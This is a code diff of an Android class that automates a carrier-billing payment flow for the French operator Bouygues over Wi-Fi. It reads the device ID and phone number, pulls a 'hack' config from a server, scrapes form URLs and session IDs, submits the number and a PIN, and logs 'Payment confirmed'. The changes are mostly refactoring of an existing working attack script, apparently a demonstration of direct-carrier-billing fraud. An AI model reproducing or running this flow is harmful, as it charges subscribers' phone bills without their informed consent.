@@ -1,4 +1,4 @@
-package com.dcbsecure.demo201503.dcbsecure.flow;
+package com.dcbsecure.demo201503.dcbsecure.flow.FR.Bouygues;
 
 import android.content.Context;
 import android.os.Handler;
@@ -8,31 +8,19 @@ import android.util.Log;
 import android.view.View;
 
 import com.dcbsecure.demo201503.dcbsecure.ActivityMainWindow;
+import com.dcbsecure.demo201503.dcbsecure.flow.FlowUtil;
 import com.dcbsecure.demo201503.dcbsecure.managers.ConfigMgr;
 import com.dcbsecure.demo201503.dcbsecure.managers.PreferenceMgr;
 import com.dcbsecure.demo201503.dcbsecure.managers.TrackMgr;
 import com.dcbsecure.demo201503.dcbsecure.request.RequestResult;
-import com.dcbsecure.demo201503.dcbsecure.util.PayUtil;
 import com.dcbsecure.demo201503.dcbsecure.util.SyncRequestUtil;
-import com.loopj.android.http.PersistentCookieStore;
-import com.loopj.android.http.RequestParams;
-import com.loopj.android.http.SyncHttpClient;
-import com.loopj.android.http.TextHttpResponseHandler;
 
-import org.apache.http.Header;
-import org.apache.http.HttpResponse;
 import org.apache.http.NameValuePair;
-import org.apache.http.ProtocolException;
-import org.apache.http.impl.client.DefaultRedirectHandler;
 import org.apache.http.message.BasicNameValuePair;
-import org.apache.http.protocol.HttpContext;
 import org.json.JSONException;
 import org.json.JSONObject;
 
-import java.net.URI;
-import java.net.URISyntaxException;
 import java.util.ArrayList;
-import java.util.Arrays;
 import java.util.Timer;
 import java.util.TimerTask;
 import java.util.regex.Matcher;
@@ -56,7 +44,7 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
 
     public void onClick()
     {
-        Log.d("FLIRTY", "Started handling payment over WIFI");
+        Log.d("DCBSECURE", "Started handling payment over WIFI");
 
 
         final String deviceid = ConfigMgr.lookupDeviceId(activityMainWindow);
@@ -96,10 +84,10 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
                     long msisdn = ConfigMgr.lookupMsisdnFromTelephonyMgr(activityMainWindow);
                     if(msisdn>0) params.add(new BasicNameValuePair("msisdn", ""+msisdn));
 
-                    params.add(new BasicNameValuePair("wifi", PayUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));
+                    params.add(new BasicNameValuePair("wifi", FlowUtil.isUsingMobileData(activityMainWindow) ? "0" : "1"));
 
                     String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
-                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent);
+                    JSONObject hackConfigResponse = SyncRequestUtil.doSynchronousHttpPostReturnsJson(ConfigMgr.getString(activityMainWindow, "SERVER") + "/api/hack/lookup", params, userAgent, activityMainWindow);
                     if (hackConfigResponse == null)
                     {
                         TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, 0, 0, true, "hack could not read config", "deviceid:" + deviceid);
@@ -115,16 +103,14 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
                 catch (JSONException e)
                 {
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, "Could not read hack config", "deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow));
-                    Log.d("FLIRTY", "Could not read hack config");
+                    Log.d("DCBSECURE", "Could not read hack config");
                     handler.sendEmptyMessage(0);
                 }
                 catch (Exception e)
                 {
                     String stack = TrackMgr.getStackAsString(e);
-                    String message = "unexpected exception deviceid:" + ConfigMgr.lookupDeviceId(activityMainWindow);
+                    String message = "unexpected exception " + e.getClass().getName() + " " + e.getMessage();
                     TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
-                    Log.d("FLIRTY", message + " exception:" + e.getClass().getName() + " " + e.getMessage());
-                    handler.sendEmptyMessage(0);
                 }
 
             }
@@ -133,6 +119,7 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
     }
 
     private void runFlowNotInMainThread(JSONObject hackConfig, final String deviceid, final long runid, final Handler handler)
+            throws Exception
     {
         final String userAgent = PreferenceMgr.getUserAgent(activityMainWindow);
 
@@ -164,8 +151,8 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
             boolean matchFound = matcher.find();
 
             if(matchFound){
-                Log.d("FLIRTY", "FOUND");
-                activityMainWindow.updateLogs("Confirmation form found");
+                Log.d("DCBSECURE", "FOUND");
+                activityMainWindow.updateLogs("\nConfirmation form found");
                 msisdnSubmitUrl = matcher.group(1);
             }
         }
@@ -207,17 +194,17 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
                 msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44.substring(3);
             if (msisdnStartingWith0not44 != null && !msisdnStartingWith0not44.startsWith("0"))
                 msisdnStartingWith0not44 = "0" + msisdnStartingWith0not44;
-            activityMainWindow.updateLogs("\nEntering phone number ("+msisdnStartingWith0not44+"), form "+msisdnSubmitUrl);
+            activityMainWindow.updateLogs("\nEntering phone number "+msisdnStartingWith0not44);
 
             Pattern pattern = Pattern.compile("<input id=\"gw_idsession\" type=\"text\" name=\"gw_idsession\" value=\"([a-z0-9\\-]+)\" style=\"display: none;\" />");
             Matcher matcher = pattern.matcher(htmlDataConfirm);
             String gw_idsession = null;
             if(matcher.find()){
-                Log.d("FLIRTY", "FOUND gw_idsession");
+                Log.d("DCBSECURE", "FOUND gw_idsession");
                 gw_idsession = matcher.group(1);
             }
             else{
-                Log.d("FLIRTY", "NOT FOUND gw_idsession");
+                Log.d("DCBSECURE", "NOT FOUND gw_idsession");
             }
 
             final ArrayList<NameValuePair> paramsForConfirm = new ArrayList();
@@ -226,7 +213,7 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
             paramsForConfirm.add(new BasicNameValuePair("msisdn", msisdnStartingWith0not44));
 
             // Here we have to make one last POST request to confirm
-            final RequestResult resultAfterMsisdn = SyncRequestUtil.doSynchronousHttpPost(msisdnSubmitUrl, paramsForConfirm,userAgent);
+            final RequestResult resultAfterMsisdn = SyncRequestUtil.doSynchronousHttpPost(msisdnSubmitUrl, paramsForConfirm,userAgent, activityMainWindow);
             final String pinUrl = resultAfterMsisdn!=null?resultAfterMsisdn.getUrl():null;
             final String htmlDataPin = resultAfterMsisdn!=null?resultAfterMsisdn.getContent():null;
 
@@ -264,8 +251,8 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
                                 Matcher matcher2 = pattern2.matcher(htmlDataPin);
                                 boolean matchFound = matcher2.find();
                                 if (matchFound) {
-                                    Log.d("FLIRTY", "FOUND");
-                                    activityMainWindow.updateLogs("Confirmation form found");
+                                    Log.d("DCBSECURE", "FOUND");
+                                    activityMainWindow.updateLogs("\nConfirmation form found");
                                     pinSubmitUrl = matcher2.group(1);
                                 }
 
@@ -285,32 +272,41 @@ public class FlowFRBouyguesWifi implements View.OnClickListener
                                     Matcher matcher3 = pattern3.matcher(htmlDataPin);
                                     String gw_idsession2 = null;
                                     if (matcher3.find()) {
-                                        Log.d("FLIRTY", "FOUND gw_idsession");
+                                        Log.d("DCBSECURE", "FOUND gw_idsession");
                                         gw_idsession2 = matcher3.group(1);
                                     } else {
-                                        Log.d("FLIRTY", "NOT FOUND gw_idsession");
+                                        Log.d("DCBSECURE", "NOT FOUND gw_idsession");
                                     }
 
-                                    Log.d("FLIRTY", "PIN SUBMIT : "+pinSubmitUrl);
+                                    Log.d("DCBSECURE", "PIN SUBMIT : "+pinSubmitUrl);
                                     pinSubmitUrl+="?act=sap&gw_idsession="+gw_idsession2+"&random="+pin;
-                                    Log.d("FLIRTY", "PIN SUBMIT : "+pinSubmitUrl);
+                                    Log.d("DCBSECURE", "PIN SUBMIT : "+pinSubmitUrl);
                                     // Here we have to make one last POST request to confirm
-                                    final RequestResult resultAfterPin = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, pinSubmitUrl, userAgent);
-                                    final String confirmUrl = resultAfterPin != null ? resultAfterPin.getUrl() : null;
+                                    try
+                                    {
+                                        final RequestResult resultAfterPin = SyncRequestUtil.doSynchronousHttpGetCallReturnsString(activityMainWindow, pinSubmitUrl, userAgent);
+                                        final String confirmUrl = resultAfterPin != null ? resultAfterPin.getUrl() : null;
 
-                                    if (resultAfterPin == null) {
-                                        String subject = "Pin returns null (url:" + confirmUrl + ")";
-                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
-                                        handler.sendEmptyMessage(0);
-                                        return;
-                                    } else if (resultAfterPin.getHttpCode() != 200) {
-                                        String subject = "Pin returns http code " + resultAfterMsisdn.getHttpCode();
-                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
-                                        handler.sendEmptyMessage(0);
-                                        return;
-                                    } else if (confirmUrl != null && confirmUrl.contains("google.fr")) {
-                                        Log.d("FLIRTY", "PAID");
-                                        activityMainWindow.updateLogs("Payment confirmed !");
+                                        if (resultAfterPin == null) {
+                                            String subject = "Pin returns null (url:" + confirmUrl + ")";
+                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
+                                            handler.sendEmptyMessage(0);
+                                            return;
+                                        } else if (resultAfterPin.getHttpCode() != 200) {
+                                            String subject = "Pin returns http code " + resultAfterMsisdn.getHttpCode();
+                                            TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, false, subject, htmlDataPin);
+                                            handler.sendEmptyMessage(0);
+                                            return;
+                                        } else if (confirmUrl != null && confirmUrl.contains("google.fr")) {
+                                            Log.d("DCBSECURE", "PAID");
+                                            activityMainWindow.updateLogs("\nPayment confirmed !");
+                                        }
+                                    }
+                                    catch(Exception e)
+                                    {
+                                        String stack = TrackMgr.getStackAsString(e);
+                                        String message = "unexpected exception " + e.getClass().getName() + " " + e.getMessage();
+                                        TrackMgr.reportHackrunStatus(activityMainWindow, deviceid, runid, 0, true, message, stack);
                                     }
                                 }
                                 return;
